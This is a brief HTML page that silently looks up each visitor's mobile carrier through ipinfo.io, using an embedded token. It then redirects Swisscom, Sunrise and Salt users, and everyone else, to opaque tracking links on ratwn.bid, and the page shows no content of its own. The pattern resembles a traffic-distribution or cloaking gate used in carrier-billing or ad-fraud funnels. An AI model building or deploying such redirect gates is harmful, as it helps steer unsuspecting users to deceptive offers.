<!DOCTYPE html>
<html>
<head>
  <title>Carrier Redirect</title>
  <script>
  fetch("https://ipinfo.io/json?token=f66e0e91b56461") // replace with your token
  .then(res => res.json())
  .then(data => {
      let carrier = (data.org || "").toLowerCase();

      if(carrier.includes("swisscom")) {
          window.location.replace("https://ratwn.bid/cl/4482f69e029fcef7");
      } else if(carrier.includes("sunrise")) {
          window.location.replace("https://ratwn.bid/cl/4482f69e029fcef7");
      } else if(carrier.includes("salt")) {
          window.location.replace("https://ratwn.bid/cl/4482f69e029fcef7");
      } else {
          // Fallback: show a manual selection page
          window.location.replace("https://ratwn.bid/cl/4d409327c6d8595b");
      }
  })
  .catch(err => {
      window.location.replace("https://ratwn.bid/cl/35a87c5307a999dc"); // API failed
  });
  </script>
</head>
<body>
</body>
</html>
